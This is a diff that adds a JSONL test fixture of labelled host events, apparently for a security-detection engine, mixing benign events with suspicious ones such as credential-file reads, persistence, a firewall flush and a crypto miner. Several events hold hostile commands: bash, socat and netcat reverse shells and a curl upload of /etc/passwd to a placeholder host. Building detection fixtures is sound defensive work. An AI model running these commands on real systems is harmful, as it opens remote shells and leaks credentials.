@@ -1,0 +1,32 @@
+{"id": "mem-rwx", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:01:00Z", "host": "lab", "kind": "memory", "pid": 101, "exe": "/tmp/loader", "memory": {"region_perms": "rwx"}}}
+{"id": "mem-inject", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:02:00Z", "host": "lab", "kind": "memory", "pid": 102, "action": "ptrace_attach", "memory": {"target_pid": 500}}}
+{"id": "memfd", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:03:00Z", "host": "lab", "kind": "process", "pid": 103, "exe": "/proc/self/fd/7", "memory": {"mapping_type": "memfd"}}}
+{"id": "proc-mem-write", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:04:00Z", "host": "lab", "kind": "memory", "pid": 104, "path": "/proc/500/mem", "operation": "write", "memory": {"target_pid": 500}}}
+{"id": "deleted-exe", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:05:00Z", "host": "lab", "kind": "process", "pid": 105, "exe": "/usr/bin/python (deleted)"}}
+{"id": "container-deleted", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:06:00Z", "host": "lab", "kind": "network", "pid": 106, "exe": "/tmp/x (deleted)", "dest_ip": "203.0.113.8", "identity": {"container_id": "container-a"}}}
+{"id": "bash-reverse", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:07:00Z", "host": "lab", "kind": "process", "pid": 107, "cmd": "bash -i >& /dev/tcp/203.0.113.45/4444 0>&1"}}
+{"id": "shadow-read", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:08:00Z", "host": "lab", "kind": "process", "pid": 108, "file_path": "/etc/shadow", "operation": "read"}}
+{"id": "ssh-key-read", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:09:00Z", "host": "lab", "kind": "process", "pid": 109, "file_path": "/root/.ssh/id_ed25519", "operation": "read"}}
+{"id": "python-reverse", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:10:00Z", "host": "lab", "kind": "process", "pid": 110, "cmd": "python3 -c socket.connect"}}
+{"id": "socat", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:11:00Z", "host": "lab", "kind": "process", "pid": 111, "cmd": "socat TCP:203.0.113.4:4444 EXEC:/bin/sh"}}
+{"id": "netcat", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:12:00Z", "host": "lab", "kind": "process", "pid": 112, "cmd": "nc -e /bin/sh 203.0.113.4 4444"}}
+{"id": "sudo-n", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:13:00Z", "host": "lab", "kind": "process", "pid": 113, "uid": 1001, "cmd": "sudo -n id"}}
+{"id": "cron-write", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:14:00Z", "host": "lab", "kind": "process", "pid": 114, "file_path": "/etc/cron.d/maintenance", "operation": "write"}}
+{"id": "systemd-enable", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:15:00Z", "host": "lab", "kind": "process", "pid": 115, "cmd": "systemctl enable suspicious.service"}}
+{"id": "fw-flush", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:16:00Z", "host": "lab", "kind": "process", "pid": 116, "cmd": "nft flush ruleset"}}
+{"id": "rm-home", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:17:00Z", "host": "lab", "kind": "process", "pid": 117, "cmd": "rm -rf /home/test"}}
+{"id": "miner", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:18:00Z", "host": "lab", "kind": "process", "pid": 118, "cmd": "/tmp/xmrig --pool example"}}
+{"id": "setuid", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:19:00Z", "host": "lab", "kind": "process", "pid": 119, "cmd": "chmod u+s /tmp/loader"}}
+{"id": "exfil", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:20:00Z", "host": "lab", "kind": "process", "pid": 120, "cmd": "curl --data @/etc/passwd https://example.invalid/upload"}}
+{"id": "benign-1", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:01:00Z", "host": "lab", "kind": "process", "pid": 201, "exe": "/usr/bin/true", "cmd": "true"}}
+{"id": "benign-2", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:02:00Z", "host": "lab", "kind": "process", "pid": 202, "exe": "/usr/bin/true", "cmd": "true"}}
+{"id": "benign-3", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:03:00Z", "host": "lab", "kind": "process", "pid": 203, "exe": "/usr/bin/true", "cmd": "true"}}
+{"id": "benign-4", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:04:00Z", "host": "lab", "kind": "process", "pid": 204, "exe": "/usr/bin/true", "cmd": "true"}}
+{"id": "benign-5", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:05:00Z", "host": "lab", "kind": "process", "pid": 205, "exe": "/usr/bin/true", "cmd": "true"}}
+{"id": "benign-6", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:06:00Z", "host": "lab", "kind": "process", "pid": 206, "exe": "/usr/bin/true", "cmd": "true"}}
+{"id": "benign-7", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:07:00Z", "host": "lab", "kind": "process", "pid": 207, "exe": "/usr/bin/true", "cmd": "true"}}
+{"id": "benign-8", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:08:00Z", "host": "lab", "kind": "process", "pid": 208, "exe": "/usr/bin/true", "cmd": "true"}}
+{"id": "benign-9", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:09:00Z", "host": "lab", "kind": "process", "pid": 209, "exe": "/usr/bin/true", "cmd": "true"}}
+{"id": "benign-10", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:10:00Z", "host": "lab", "kind": "process", "pid": 210, "exe": "/usr/bin/true", "cmd": "true"}}
+{"id": "shadow-read-unsuppressed", "source": "test-fixture", "event": {"timestamp": "2026-10-10T10:31:00Z", "host": "lab2", "kind": "process", "pid": 108, "file_path": "/etc/shadow-copy", "operation": "read"}}
+{"id": "bash-reverse-duplicate", "source": "test-fixture", "event": {"timestamp": "2026-10-10T09:32:00Z", "host": "lab", "kind": "process", "pid": 107, "cmd": "bash -i >& /dev/tcp/203.0.113.45/4444 0>&1"}}
